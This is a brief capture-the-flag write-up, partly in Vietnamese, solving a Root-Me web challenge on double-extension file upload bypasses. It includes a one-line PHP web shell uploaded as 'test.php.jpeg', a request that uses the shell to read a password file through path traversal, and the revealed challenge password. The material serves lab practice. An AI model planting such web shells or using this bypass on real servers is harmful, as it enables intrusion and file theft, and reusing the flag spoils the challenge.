# [File upload - Double extensions](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Double-extensions)

## Solutions

- Upload một file có tên là `test.php.jpeg` có nội dung là:

```php
<?php
system($_GET['command']);
?>
```

- Gửi request đến nơi chứa file `test.php.jpeg` với request query parameter là `?command=cat ../../../.passwd`

- Password xuất hiện trong response: `Gg9LRz-hWSxqqUKd77-_q-6G8`

## References

- <https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Secure%20file%20upload%20in%20PHP%20web%20applications.pdf?_gl=1>
